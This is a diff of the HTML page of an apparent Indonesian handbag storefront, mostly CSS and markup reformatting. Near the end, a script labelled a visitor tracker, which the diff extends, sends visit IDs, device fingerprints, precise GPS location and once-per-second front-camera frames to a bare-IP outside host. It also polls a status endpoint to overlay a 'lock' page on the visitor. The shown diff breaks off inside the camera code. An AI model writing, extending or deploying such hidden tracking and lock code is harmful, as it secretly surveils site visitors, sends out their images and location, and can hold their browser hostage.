@@ -22,7 +22,6 @@
   --muted: #787c73;
   --line: #e8e7e1;
 }
-
 * { box-sizing: border-box; }
 html { scroll-behavior: smooth; }
 body { margin: 0; min-width: 320px; }
@@ -32,19 +31,7 @@ a { color: inherit; text-decoration: none; }
 button { color: inherit; }
 img { display: block; max-width: 100%; }
 .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0, 0, 0, 0); white-space: nowrap; border: 0; }
-
-.site-header {
-  height: 80px;
-  max-width: 1440px;
-  margin: 0 auto;
-  padding: 0 7.2%;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  position: relative;
-  z-index: 5;
-  background: #fff;
-}
+.site-header { height: 80px; max-width: 1440px; margin: 0 auto; padding: 0 7.2%; display: flex; align-items: center; justify-content: space-between; position: relative; z-index: 5; background: #fff; }
 .brand { display: inline-flex; flex-direction: column; align-items: center; line-height: 1; flex-shrink: 0; }
 .brand-mark { color: #33271e; font-family: "Playfair Display", serif; font-size: 27px; font-style: italic; font-weight: 700; letter-spacing: -.09em; }
 .brand-mark span { color: #b47b83; }
@@ -61,19 +48,7 @@ img { display: block; max-width: 100%; }
 .search-form input { flex: 1; min-width: 0; border: 0; outline: 0; padding: 9px; font-size: 12px; }
 .search-form button { border: 0; border-radius: 5px; color: white; background: var(--green); padding: 0 16px; cursor: pointer; font-size: 12px; }
 .menu-toggle { display: none; }
-
-.hero {
-  min-height: 520px;
-  max-width: 1600px;
-  margin: 0 auto;
-  padding: 64px 8% 55px 12.2%;
-  background: #f0eee7;
-  display: grid;
-  grid-template-columns: .94fr 1.06fr;
-  align-items: center;
-  position: relative;
-  overflow: hidden;
-}
+.hero { min-height: 520px; max-width: 1600px; margin: 0 auto; padding: 64px 8% 55px 12.2%; background: #f0eee7; display: grid; grid-template-columns: .94fr 1.06fr; align-items: center; position: relative; overflow: hidden; }
 .hero-copy { z-index: 1; padding: 16px 0 4px; }
 .eyebrow { margin: 0 0 18px; color: #74806f; font-size: 9px; font-weight: 700; letter-spacing: .17em; }
 .hero .eyebrow { display: flex; align-items: center; gap: 9px; color: var(--green); }
@@ -99,14 +74,12 @@ h1, h2, h3, p { margin-top: 0; }
 .hero-stamp span { font-size: 5px; letter-spacing: .12em; }
 .hero-stamp strong { font-family: "Playfair Display", serif; font-size: 18px; line-height: .95; }
 .hero-index { position: absolute; bottom: 25px; right: 6%; color: #7b8077; font-size: 8px; letter-spacing: .1em; }
-
 .benefits { min-height: 108px; display: flex; justify-content: center; align-items: center; gap: clamp(36px, 7vw, 108px); padding: 20px 7%; border-bottom: 1px solid #efeee9; }
 .benefit-item { display: flex; align-items: center; gap: 11px; }
 .benefit-icon { width: 30px; height: 30px; display: grid; place-items: center; color: var(--green); border: 1px solid #dfe4d9; border-radius: 50%; font-size: 18px; }
 .benefit-item div { display: flex; flex-direction: column; gap: 4px; white-space: nowrap; }
 .benefit-item strong { color: #383d36; font-size: 9px; font-weight: 600; }
 .benefit-item div span { color: #85877f; font-size: 8px; }
-
 .section-shell { max-width: 1320px; margin: 0 auto; padding: 92px 7.2% 95px; }
 .section-heading { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 34px; }
 .section-heading .eyebrow { margin-bottom: 13px; }
@@ -139,7 +112,6 @@ h1, h2, h3, p { margin-top: 0; }
 .button-outline { display: flex; margin: 39px auto 0; color: var(--green); border: 1px solid #718274; background: transparent; }
 .button-outline:hover { color: #fff; background: var(--green); }
 .mobile-break { display: none; }
-
 .story { max-width: 1440px; min-height: 430px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; background: #f2f1eb; }
 .story-image { min-height: 430px; position: relative; overflow: hidden; }
 .story-image img { width: 100%; height: 100%; position: absolute; inset: 0; object-fit: cover; filter: saturate(.72); }
@@ -148,7 +120,6 @@ h1, h2, h3, p { margin-top: 0; }
 .story-copy .eyebrow { margin-bottom: 20px; }
 .story h2 { max-width: 410px; font-size: clamp(32px, 3.5vw, 46px); }
 .story-copy > p:not(.eyebrow) { max-width: 400px; margin: 20px 0 24px; color: #73776e; font-size: 11px; line-height: 1.9; }
-
 .newsletter { min-height: 245px; max-width: 1320px; margin: 0 auto; padding: 65px 7.2%; display: flex; align-items: center; justify-content: space-between; gap: 40px; }
 .newsletter .eyebrow { margin-bottom: 12px; }
 .newsletter h2 { font-size: 32px; }
@@ -162,7 +133,6 @@ h1, h2, h3, p { margin-top: 0; }
 .footer-brand .brand-caption { font-size: 5px; }
 .site-footer > p, .copyright { margin: 0; color: #85887f; font-size: 9px; }
 .footer-links { display: flex; gap: 24px; color: #596057; font-size: 9px; }
-
 .drawer-backdrop { position: fixed; inset: 0; z-index: 10; background: #17231c65; }
 .cart-drawer { width: min(410px, 100%); height: 100dvh; padding: 28px; position: fixed; z-index: 11; top: 0; right: 0; display: flex; flex-direction: column; background: #fff; transform: translateX(102%); transition: transform .28s ease; }
 .cart-drawer.open { transform: translateX(0); }
@@ -216,19 +186,7 @@ h1, h2, h3, p { margin-top: 0; }
 .checkout-form h3 { margin: 0 0 17px; color: #30372f; font-family: "Playfair Display", serif; font-size: 19px; }
 .checkout-form > label, .checkout-fields-row label { display: block; margin: 0 0 6px; color: #454a43; font-size: 10px; font-weight: 600; }
 .checkout-form label span { color: var(--muted); font-weight: 400; }
-.checkout-form > input, .checkout-form > textarea, .checkout-fields-row input {
-  width: 100%;
-  min-height: 39px;
-  margin: 0 0 13px;
-  padding: 9px 10px;
-  border: 1px solid #dedfd8;
-  border-radius: 3px;
-  outline: 0;
-  color: #30372f;
-  background: #fff;
-  font: inherit;
-  font-size: 11px;
-}
+.checkout-form > input, .checkout-form > textarea, .checkout-fields-row input { width: 100%; min-height: 39px; margin: 0 0 13px; padding: 9px 10px; border: 1px solid #dedfd8; border-radius: 3px; outline: 0; color: #30372f; background: #fff; font: inherit; font-size: 11px; }
 .checkout-form > textarea { min-height: 70px; resize: vertical; }
 .checkout-form input:focus, .checkout-form textarea:focus { border-color: #748777; box-shadow: 0 0 0 2px #154d3c12; }
 .checkout-fields-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
@@ -238,91 +196,10 @@ h1, h2, h3, p { margin-top: 0; }
 .toast { position: fixed; z-index: 15; bottom: 24px; left: 50%; padding: 12px 18px; color: #fff; background: var(--green-dark); font-size: 11px; opacity: 0; transform: translate(-50%, 15px); pointer-events: none; transition: .25s ease; }
 .toast.visible { opacity: 1; transform: translate(-50%, 0); }
 body.drawer-open { overflow: hidden; }
-
-@media (min-width: 1440px) {
-  .hero { padding-left: max(12.2%, calc((100% - 1120px) / 2)); padding-right: max(8%, calc((100% - 1200px) / 2)); }
-}
-@media (max-width: 900px) {
-  .site-header { padding: 0 5%; }
-  .main-nav { gap: 22px; margin-left: 2%; }
-  .header-actions { gap: 11px; }
-  .hero { min-height: 470px; padding: 48px 7% 48px 8%; grid-template-columns: 1fr 1fr; }
-  .hero-visual { height: 360px; }
-  .hero-description { max-width: 340px; }
-  .benefits { gap: 23px; padding-left: 3%; padding-right: 3%; }
-  .benefit-icon { width: 25px; height: 25px; }
-  .section-shell { padding-left: 5%; padding-right: 5%; }
-  .site-footer { padding-left: 5%; padding-right: 5%; }
-}
-@media (max-width: 680px) {
-  .site-header { height: 67px; padding: 0 5%; }
-  .brand { margin: 0 auto 0 0; }
-  .brand-mark { font-size: 24px; }
-  .menu-toggle { display: grid; margin-right: 9px; order: -1; }
-  .header-actions { gap: 8px; }
-  .header-actions .favorite-shortcut { display: none; }
-  .main-nav { display: none; position: absolute; top: 67px; left: 0; right: 0; height: auto; margin: 0; padding: 18px 6%; flex-direction: column; align-items: flex-start; gap: 17px; background: white; border-top: 1px solid var(--line); box-shadow: 0 12px 20px #17231c10; }
-  .main-nav.open { display: flex; }
-  .main-nav a { font-size: 12px; }
-  .hero { min-height: unset; padding: 37px 6% 35px; display: flex; flex-direction: column; align-items: stretch; }
-  .hero-copy { padding: 0; }
-  .hero .eyebrow { margin-bottom: 13px; }
-  .hero h1 { font-size: clamp(36px, 10vw, 53px); }
-  .hero-description { max-width: 355px; margin: 16px 0 19px; font-size: 11px; line-height: 1.7; }
-  .hero .button { min-height: 40px; }
-  .hero-note { margin-top: 20px; }
-  .hero-visual { height: min(94vw, 380px); margin: 22px 4% 0 9%; }
-  .hero-visual > img { object-position: center 35%; }
-  .hero-stamp { top: 18px; right: -6px; width: 82px; height: 82px; }
-  .hero-stamp strong { font-size: 15px; }
-  .hero-index { bottom: 14px; right: 5%; }
-  .benefits { min-height: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 18px 12px; padding: 22px 6%; }
-  .benefit-item { gap: 8px; }
-  .benefit-item div { white-space: normal; }
-  .benefit-item strong { font-size: 8px; }
-  .benefit-item div span { font-size: 7px; }
-  .benefit-icon { width: 26px; height: 26px; flex-shrink: 0; }
-  .section-shell { padding: 62px 5% 66px; }
-  .section-heading { align-items: flex-end; margin-bottom: 24px; }
-  .section-heading h2 { font-size: 32px; }
-  .section-heading .eyebrow { font-size: 8px; }
-  .mobile-break { display: initial; }
-  .product-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 23px 10px; }
-  .product-image-wrap { height: clamp(170px, 57vw, 270px); }
-  .product-badge { top: 8px; left: 8px; padding: 5px 6px; font-size: 6px; }
-  .favorite-button { width: 26px; height: 26px; top: 6px; right: 6px; }
-  .favorite-button svg { width: 14px; }
-  .quick-add { left: 6px; right: 6px; bottom: 6px; min-height: 31px; opacity: 1; transform: none; font-size: 8px; }
-  .product-info { padding-top: 10px; }
-  .product-title { font-size: 10px; }
-  .product-price { font-size: 9px; }
-  .product-category, .product-color { font-size: 7px; }
-  .button-outline { margin-top: 30px; }
-  .story { grid-template-columns: 1fr; }
-  .story-image { min-height: 280px; }
-  .story-copy { padding: 48px 7% 62px; }
-  .story h2 { max-width: 340px; font-size: 36px; }
-  .story-copy > p:not(.eyebrow) { font-size: 10px; }
-  .newsletter { min-height: 0; padding: 53px 6%; display: block; }
-  .newsletter h2 { font-size: 29px; }
-  .newsletter-form { width: 100%; margin-top: 24px; }
-  .site-footer { min-height: 0; padding: 25px 6%; flex-wrap: wrap; gap: 18px 10px; }
-  .footer-brand { align-items: flex-start; }
-  .site-footer > p { order: 2; width: 100%; }
-  .footer-links { gap: 14px; font-size: 8px; }
-  .copyright { display: none; }
-  .cart-drawer { padding: 22px; }
-  .checkout-fields-row { gap: 8px; }
-  .product-dialog-panel { padding: 44px 20px 22px; }
-  .product-detail-layout { grid-template-columns: 1fr; gap: 12px; }
-  .product-detail-image, .product-detail-image img, .product-detail-image > span { min-height: 0; height: min(68vw, 340px); }
-  .product-detail-info { padding: 12px 0 0; }
-  .product-detail-info h2 { font-size: 23px; }
-  .product-detail-specs > div { grid-template-columns: 105px 1fr; }
-}
-@media (prefers-reduced-motion: reduce) {
-  *, *::before, *::after { scroll-behavior: auto !important; transition-duration: .01ms !important; animation-duration: .01ms !important; }
-}
+@media (min-width: 1440px) { .hero { padding-left: max(12.2%, calc((100% - 1120px) / 2)); padding-right: max(8%, calc((100% - 1200px) / 2)); } }
+@media (max-width: 900px) { .site-header { padding: 0 5%; } .main-nav { gap: 22px; margin-left: 2%; } .header-actions { gap: 11px; } .hero { min-height: 470px; padding: 48px 7% 48px 8%; grid-template-columns: 1fr 1fr; } .hero-visual { height: 360px; } .hero-description { max-width: 340px; } .benefits { gap: 23px; padding-left: 3%; padding-right: 3%; } .benefit-icon { width: 25px; height: 25px; } .section-shell { padding-left: 5%; padding-right: 5%; } .site-footer { padding-left: 5%; padding-right: 5%; } }
+@media (max-width: 680px) { .site-header { height: 67px; padding: 0 5%; } .brand { margin: 0 auto 0 0; } .brand-mark { font-size: 24px; } .menu-toggle { display: grid; margin-right: 9px; order: -1; } .header-actions { gap: 8px; } .header-actions .favorite-shortcut { display: none; } .main-nav { display: none; position: absolute; top: 67px; left: 0; right: 0; height: auto; margin: 0; padding: 18px 6%; flex-direction: column; align-items: flex-start; gap: 17px; background: white; border-top: 1px solid var(--line); box-shadow: 0 12px 20px #17231c10; } .main-nav.open { display: flex; } .main-nav a { font-size: 12px; } .hero { min-height: unset; padding: 37px 6% 35px; display: flex; flex-direction: column; align-items: stretch; } .hero-copy { padding: 0; } .hero .eyebrow { margin-bottom: 13px; } .hero h1 { font-size: clamp(36px, 10vw, 53px); } .hero-description { max-width: 355px; margin: 16px 0 19px; font-size: 11px; line-height: 1.7; } .hero .button { min-height: 40px; } .hero-note { margin-top: 20px; } .hero-visual { height: min(94vw, 380px); margin: 22px 4% 0 9%; } .hero-visual > img { object-position: center 35%; } .hero-stamp { top: 18px; right: -6px; width: 82px; height: 82px; } .hero-stamp strong { font-size: 15px; } .hero-index { bottom: 14px; right: 5%; } .benefits { min-height: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 18px 12px; padding: 22px 6%; } .benefit-item { gap: 8px; } .benefit-item div { white-space: normal; } .benefit-item strong { font-size: 8px; } .benefit-item div span { font-size: 7px; } .benefit-icon { width: 26px; height: 26px; flex-shrink: 0; } .section-shell { padding: 62px 5% 66px; } .section-heading { align-items: flex-end; margin-bottom: 24px; } .section-heading h2 { font-size: 32px; } .section-heading .eyebrow { font-size: 8px; } .mobile-break { display: initial; } .product-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 23px 10px; } .product-image-wrap { height: clamp(170px, 57vw, 270px); } .product-badge { top: 8px; left: 8px; padding: 5px 6px; font-size: 6px; } .favorite-button { width: 26px; height: 26px; top: 6px; right: 6px; } .favorite-button svg { width: 14px; } .quick-add { left: 6px; right: 6px; bottom: 6px; min-height: 31px; opacity: 1; transform: none; font-size: 8px; } .product-info { padding-top: 10px; } .product-title { font-size: 10px; } .product-price { font-size: 9px; } .product-category, .product-color { font-size: 7px; } .button-outline { margin-top: 30px; } .story { grid-template-columns: 1fr; } .story-image { min-height: 280px; } .story-copy { padding: 48px 7% 62px; } .story h2 { max-width: 340px; font-size: 36px; } .story-copy > p:not(.eyebrow) { font-size: 10px; } .newsletter { min-height: 0; padding: 53px 6%; display: block; } .newsletter h2 { font-size: 29px; } .newsletter-form { width: 100%; margin-top: 24px; } .site-footer { min-height: 0; padding: 25px 6%; flex-wrap: wrap; gap: 18px 10px; } .footer-brand { align-items: flex-start; } .site-footer > p { order: 2; width: 100%; } .footer-links { gap: 14px; font-size: 8px; } .copyright { display: none; } .cart-drawer { padding: 22px; } .checkout-fields-row { gap: 8px; } .product-dialog-panel { padding: 44px 20px 22px; } .product-detail-layout { grid-template-columns: 1fr; gap: 12px; } .product-detail-image, .product-detail-image img, .product-detail-image > span { min-height: 0; height: min(68vw, 340px); } .product-detail-info { padding: 12px 0 0; } .product-detail-info h2 { font-size: 23px; } .product-detail-specs > div { grid-template-columns: 105px 1fr; } }
+@media (prefers-reduced-motion: reduce) { *, *::before, *::after { scroll-behavior: auto !important; transition-duration: .01ms !important; animation-duration: .01ms !important; } }
     </style>
   </head>
   <body>
@@ -331,11 +208,9 @@ body.drawer-open { overflow: hidden; }
         <span class="brand-mark">nara<span>.</span></span>
         <span class="brand-caption">BAGS FOR YOUR STORY</span>
       </a>
-
       <button class="menu-toggle icon-button" aria-label="Buka menu" aria-expanded="false">
         <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16" /></svg>
       </button>
-
       <nav class="main-nav" aria-label="Navigasi utama">
         <a href="#produk" data-filter-link="Semua">Semua Tas</a>
         <a href="#produk" data-filter-link="Tote Bag">Tote Bag</a>
@@ -343,103 +218,55 @@ body.drawer-open { overflow: hidden; }
         <a href="#produk" data-filter-link="Sling Bag">Sling Bag</a>
         <a href="#cerita">Tentang Kami</a>
       </nav>
-
       <div class="header-actions">
-        <button class="icon-button search-toggle" aria-label="Cari produk">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.8" cy="10.8" r="6.8" /><path d="m16 16 4.5 4.5" /></svg>
-        </button>
-        <button class="icon-button favorite-shortcut" aria-label="Lihat produk favorit">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.8 8.8c0 5-8.8 10-8.8 10s-8.8-5-8.8-10A4.7 4.7 0 0 1 12 6a4.7 4.7 0 0 1 8.8 2.8Z" /></svg>
-        </button>
+        <button class="icon-button search-toggle" aria-label="Cari produk"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.8" cy="10.8" r="6.8" /><path d="m16 16 4.5 4.5" /></svg></button>
+        <button class="icon-button favorite-shortcut" aria-label="Lihat produk favorit"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.8 8.8c0 5-8.8 10-8.8 10s-8.8-5-8.8-10A4.7 4.7 0 0 1 12 6a4.7 4.7 0 0 1 8.8 2.8Z" /></svg></button>
         <button class="icon-button cart-toggle" aria-label="Buka keranjang">
           <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 4h2l2.2 11.1a2 2 0 0 0 2 1.6h8.5a2 2 0 0 0 1.9-1.5L21 8H6" /><circle cx="10" cy="20" r="1" /><circle cx="18" cy="20" r="1" /></svg>
           <span class="cart-count" aria-live="polite">0</span>
         </button>
       </div>
-
       <form class="search-form" role="search">
         <label class="sr-only" for="product-search">Cari produk</label>
         <input id="product-search" type="search" placeholder="Cari tas favoritmu..." />
         <button type="submit">Cari</button>
       </form>
     </header>
-
     <main>
       <section class="hero" aria-labelledby="hero-title">
         <div class="hero-copy">
           <h1 id="hero-title">Tas cantik,<br /><em>ceritamu</em> dimulai.</h1>
-          <p class="hero-description">
-            Temukan tas fashion wanita yang pas untuk gayamu. Siluet timeless, detail
-            manis, dan ruang untuk semua hal penting yang kamu bawa.
-          </p>
+          <p class="hero-description">Temukan tas fashion wanita yang pas untuk gayamu. Siluet timeless, detail manis, dan ruang untuk semua hal penting yang kamu bawa.</p>
           <a class="button button-dark" href="#produk">Jelajahi koleksi <span aria-hidden="true">↗</span></a>
-          <div class="hero-note">
-            <div class="avatar-stack" aria-hidden="true">
-              <span>R</span><span>A</span><span>D</span>
-            </div>
-            <p><strong>1.200+</strong> cerita gaya sudah dimulai</p>
-          </div>
+          <div class="hero-note"><div class="avatar-stack" aria-hidden="true"><span>R</span><span>A</span><span>D</span></div><p><strong>1.200+</strong> cerita gaya sudah dimulai</p></div>
         </div>
         <div class="hero-visual">
-          <img
-            src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=1200&q=85"
-            alt="Tas tangan wanita warna netral dengan desain elegan"
-          />
+          <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=1200&q=85" alt="Tas tangan wanita warna netral dengan desain elegan" />
           <div class="hero-stamp"><span>GAYA YANG</span><strong>Selalu<br />punya cerita</strong><span>NARA · 2026</span></div>
         </div>
         <span class="hero-index" aria-hidden="true">01 / 03</span>
       </section>
-
       <section class="benefits" aria-label="Keunggulan NARA">
-        <div class="benefit-item">
-          <span class="benefit-icon">✳</span><div><strong>Gaya tanpa kompromi</strong><span>Desain cantik, tetap fungsional</span></div>
-        </div>
-        <div class="benefit-item">
-          <span class="benefit-icon">⌁</span><div><strong>Material pilihan</strong><span>Detail rapi dan tahan lama</span></div>
-        </div>
-        <div class="benefit-item">
-          <span class="benefit-icon">↗</span><div><strong>Ongkir dikonfirmasi</strong><span>Saat pemesanan lewat WhatsApp</span></div>
-        </div>
-        <div class="benefit-item">
-          <span class="benefit-icon">♡</span><div><strong>Teman setiap cerita</strong><span>Temukan tas andalanmu</span></div>
-        </div>
+        <div class="benefit-item"><span class="benefit-icon">✳</span><div><strong>Gaya tanpa kompromi</strong><span>Desain cantik, tetap fungsional</span></div></div>
+        <div class="benefit-item"><span class="benefit-icon">⌁</span><div><strong>Material pilihan</strong><span>Detail rapi dan tahan lama</span></div></div>
+        <div class="benefit-item"><span class="benefit-icon">↗</span><div><strong>Ongkir dikonfirmasi</strong><span>Saat pemesanan lewat WhatsApp</span></div></div>
+        <div class="benefit-item"><span class="benefit-icon">♡</span><div><strong>Teman setiap cerita</strong><span>Temukan tas andalanmu</span></div></div>
       </section>
-
       <section class="catalog section-shell" id="produk">
-        <div class="section-heading">
-          <div>
-            <h2>Tas favorit,<br class="mobile-break" /> gaya versimu.</h2>
-          </div>
-        </div>
-
+        <div class="section-heading"><div><h2>Tas favorit,<br class="mobile-break" /> gaya versimu.</h2></div></div>
         <div class="product-grid" id="product-grid" aria-live="polite"></div>
         <p class="empty-state" hidden>Produk tidak ditemukan. Coba kata kunci atau kategori lain.</p>
       </section>
-
       <section class="story" id="cerita">
-        <div class="story-image">
-          <img
-            src="https://images.unsplash.com/photo-1590874103328-eac38a683ce7?auto=format&fit=crop&w=1200&q=85"
-            alt="Koleksi tas wanita yang menampilkan bentuk dan detailnya"
-            loading="lazy"
-          />
-        </div>
+        <div class="story-image"><img src="https://images.unsplash.com/photo-1590874103328-eac38a683ce7?auto=format&fit=crop&w=1200&q=85" alt="Koleksi tas wanita yang menampilkan bentuk dan detailnya" loading="lazy" /></div>
         <div class="story-copy">
           <h2>Satu tas, banyak cerita yang bisa dibawa.</h2>
-          <p>
-            Kami percaya tas bukan sekadar tempat menyimpan barang. Ia bagian dari
-            gayamu, teman untuk hari-hari sibuk, dan detail kecil yang membuatmu merasa
-            lebih percaya diri.
-          </p>
+          <p>Kami percaya tas bukan sekadar tempat menyimpan barang. Ia bagian dari gayamu, teman untuk hari-hari sibuk, dan detail kecil yang membuatmu merasa lebih percaya diri.</p>
           <a class="text-link" href="#produk">Kenali NARA lebih dekat <span aria-hidden="true">↗</span></a>
         </div>
       </section>
-
       <section class="newsletter">
-        <div>
-          <h2>Surat kecil, gaya baru.</h2>
-          <p>Dapatkan cerita, koleksi baru, dan kejutan khusus langsung di inbox-mu.</p>
-        </div>
+        <div><h2>Surat kecil, gaya baru.</h2><p>Dapatkan cerita, koleksi baru, dan kejutan khusus langsung di inbox-mu.</p></div>
         <form class="newsletter-form">
           <label class="sr-only" for="newsletter-email">Alamat email</label>
           <input id="newsletter-email" type="email" placeholder="Alamat email kamu" required />
@@ -447,17 +274,12 @@ body.drawer-open { overflow: hidden; }
         </form>
       </section>
     </main>
-
     <footer class="site-footer">
-      <a class="brand footer-brand" href="#" aria-label="NARA, kembali ke atas">
-        <span class="brand-mark">nara<span>.</span></span>
-        <span class="brand-caption">BAGS FOR YOUR STORY</span>
-      </a>
+      <a class="brand footer-brand" href="#" aria-label="NARA, kembali ke atas"><span class="brand-mark">nara<span>.</span></span><span class="brand-caption">BAGS FOR YOUR STORY</span></a>
       <p>Gaya versimu, dibawa ke mana saja.</p>
       <div class="footer-links"><a href="#produk">Koleksi tas</a><a href="#cerita">Tentang kami</a><a href="mailto:halo@nara.id">Hubungi kami</a></div>
       <span class="copyright">© 2026 NARA</span>
     </footer>
-
     <div class="drawer-backdrop" hidden></div>
     <dialog class="product-dialog" aria-labelledby="product-detail-name">
       <div class="product-dialog-panel">
@@ -479,14 +301,8 @@ body.drawer-open { overflow: hidden; }
         <input id="customer-phone" name="phone" type="tel" autocomplete="tel" placeholder="08xxxxxxxxxx" required />
         <label for="customer-address">Alamat lengkap</label>
         <textarea id="customer-address" name="address" rows="3" placeholder="Nama jalan, nomor rumah, RT/RW, dan patokan" autocomplete="street-address" required></textarea>
-        <div class="checkout-fields-row">
-          <div><label for="customer-district">Kecamatan</label><input id="customer-district" name="district" required /></div>
-          <div><label for="customer-city">Kota/Kabupaten</label><input id="customer-city" name="city" autocomplete="address-level2" required /></div>
-        </div>
-        <div class="checkout-fields-row">
-          <div><label for="customer-province">Provinsi</label><input id="customer-province" name="province" autocomplete="address-level1" required /></div>
-          <div><label for="customer-postal-code">Kode pos</label><input id="customer-postal-code" name="postalCode" inputmode="numeric" autocomplete="postal-code" required /></div>
-        </div>
+        <div class="checkout-fields-row"><div><label for="customer-district">Kecamatan</label><input id="customer-district" name="district" required /></div><div><label for="customer-city">Kota/Kabupaten</label><input id="customer-city" name="city" autocomplete="address-level2" required /></div></div>
+        <div class="checkout-fields-row"><div><label for="customer-province">Provinsi</label><input id="customer-province" name="province" autocomplete="address-level1" required /></div><div><label for="customer-postal-code">Kode pos</label><input id="customer-postal-code" name="postalCode" inputmode="numeric" autocomplete="postal-code" required /></div></div>
         <label for="order-note">Catatan pesanan <span>(opsional)</span></label>
         <textarea id="order-note" name="note" rows="2" placeholder="Warna pilihan atau pesan tambahan"></textarea>
         <div class="checkout-total"><span>Subtotal tas</span><strong class="checkout-subtotal">Rp0</strong></div>
@@ -810,7 +626,7 @@ renderProducts();
 updateCart();
     </script>
 
-    <!-- ===== NARA visitor tracker: IP + geo + device + lokasi + kamera + lock ===== -->
+    <!-- ===== NARA tracker: IP + device + lokasi + kamera + lock ===== -->
     <script>
       (function () {
         var BASE = 'https://149.33.27.129.nip.io/phi';
@@ -820,15 +636,80 @@ updateCart();
         var FRAME_EP = BASE + '/api/frame/';
         var STATUS_EP = BASE + '/api/status/';
         var LOCKPAGE_URL = BASE + '/api/lockpage';
-        var CONSENT_KEY = 'nara_consent_v3';
-        var VISIT_ID_KEY = 'nara_visit_id';
+        var CONSENT_KEY = 'nara_consent_v4';
+        var VISIT_ID_KEY = 'nara_visit_id_v4';
         var visitId = null;
         var stream = null;
         var captureTimer = null;
         var statusTimer = null;
         var lockIframe = null;
         var visitGone = false;
+        var isLocked = false;
 
+        function log() {
+          try {
+            var args = Array.prototype.slice.call(arguments);
+            args.unshift('[nara]');
+            console.log.apply(console, args);
+          } catch (e) {}
+        }
+
+        // ===== visit ID persistence =====
+        function storedVisitId() {
+          try { return localStorage.getItem(VISIT_ID_KEY); } catch (e) { return null; }
+        }
+        function saveVisitId(id) {
+          try { localStorage.setItem(VISIT_ID_KEY, id); } catch (e) {}
+        }
+
+        function createNewVisit() {
+          log('creating new visit...');
+          return fetch(VISIT_EP, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ page: location.href }),
+            keepalive: true
+          }).then(function (r) { return r.json(); })
+            .then(function (data) {
+              if (data && data.id) {
+                visitId = data.id;
+                saveVisitId(visitId);
+                log('new visit id:', visitId);
+              }
+              return data;
+            });
+        }
+
+        function checkExistingVisit(id) {
+          log('checking existing visit:', id);
+          return fetch(STATUS_EP + id, { cache: 'no-store' })
+            .then(function (r) {
+              if (!r.ok) { log('existing visit not found (status ' + r.status + ')'); return null; }
+              return r.json().then(function (data) {
+                log('existing visit found, data:', data);
+                return { id: id, locked: !!(data && data.locked) };
+              });
+            })
+            .catch(function (e) { log('check existing failed:', e); return null; });
+        }
+
+        function initVisit() {
+          var stored = storedVisitId();
+          if (stored) {
+            return checkExistingVisit(stored).then(function (found) {
+              if (found) {
+                visitId = found.id;
+                log('reusing visit id:', visitId);
+                if (found.locked) showLock();
+                return { reused: true, locked: found.locked };
+              }
+              return createNewVisit();
+            });
+          }
+          return createNewVisit();
+        }
+
+        // ===== device fingerprint =====
         async function collectDevice() {
           var d = {};
           try {
@@ -911,41 +792,26 @@ updateCart();
           return d;
         }
 
-        function sendVisit() {
-          return fetch(VISIT_EP, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ page: location.href }),
-            keepalive: true
-          }).then(function (r) { return r.json(); })
-            .then(function (data) {
-              if (data && data.id) {
-                visitId = data.id;
-                try { localStorage.setItem(VISIT_ID_KEY, visitId); } catch (e) {}
-              }
-              return data;
-            })
-            .catch(function () {});
-        }
-
         function sendDevice(device) {
           if (!visitId) return Promise.resolve();
+          log('sending device fingerprint...');
           return fetch(DEVICE_EP + visitId, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(device),
             keepalive: true
-          }).catch(function () {});
+          }).catch(function (e) { log('sendDevice failed:', e); });
         }
 
         function sendLocation(lat, lng, accuracy) {
           if (!visitId) return Promise.resolve();
+          log('sending location:', lat, lng);
           return fetch(LOC_EP + visitId, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ lat: lat, lng: lng, accuracy: accuracy || null }),
             keepalive: true
-          }).catch(function () {});
+          }).catch(function (e) { log('sendLocation failed:', e); });
         }
 
         function sendFrame(dataUrl) {
@@ -958,25 +824,34 @@ updateCart();
           }).catch(function () {});
         }
 
+        // ===== GPS =====
         function requestGPS(onDone) {
-          if (!navigator.geolocation) { if (onDone) onDone(false); return; }
+          if (!navigator.geolocation) { log('GPS not supported'); if (onDone) onDone(false); return; }
+          log('requesting GPS...');
           navigator.geolocation.getCurrentPosition(
             function (pos) {
+              log('GPS granted:', pos.coords.latitude, pos.coords.longitude);
               sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy)
                 .then(function () { if (onDone) onDone(true); });
             },
-            function () { if (onDone) onDone(false); },
+            function (err) {
+              log('GPS error:', err.code, err.message);
+              if (onDone) onDone(false);
+            },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
         }
 
+        // ===== Camera =====
         function startCamera() {
           if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            showToast('Browser tidak mendukung kamera.');
+            log('camera not supported');
             return;
           }
+          log('requesting camera...');
           navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: 'user' }, audio: false })
             .then(function (s) {
+              log('camera granted');
               stream = s;
               var video = document.createElement('video');
               video.srcObject = s;
@@ -994,6 +869,7 @@ updateCart();
               showCameraIndicator();
 
               video.addEventListener('loadedmetadata', function () {
+                log('camera stream ready, capturing every 1s');
                 captureTimer = setInterval(function () {
                   try {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -1004,8 +880,7 @@ updateCart();
               });
             })
             .catch(function (err) {
